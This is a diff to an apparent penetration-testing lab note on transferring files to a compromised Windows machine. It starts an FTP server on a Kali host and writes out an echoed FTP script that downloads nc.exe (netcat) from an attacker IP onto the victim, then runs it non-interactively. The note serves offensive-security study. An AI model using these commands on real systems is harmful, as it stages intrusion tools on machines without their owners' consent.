@@ -9,12 +9,22 @@ Most windows machines have a ftp-client included. But we can't use it interactiv
 On the compromised machine we echo out the following commands into a file
 
 ```
-echo open 10.11.0.196 > ftp.txt
-echo USER offsec >> ftp.txt
-echo toor >> ftp.txt
+1. Start the FTP Service on the linux machine:
+cd /root/Documents/scripts
+root@kali:~/Documents/scripts# ./setup-pureFTP.sh
+enter username and password (offsec and toor)
+2.directory (/ftphome) is created , where the file(nc.exe) should be copied 
+```
+
+```
+echo open 10.11.0.5 21> ftp.txt
+echo USER offsec>> ftp.txt
+echo ftp>> ftp.txt
 echo bin >> ftp.txt
-echo GET wget.exe >> ftp.txt
+echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
+
+ftp -v -n -s:ftp.txt
 ```
 
 Then run this command to connect to the ftp
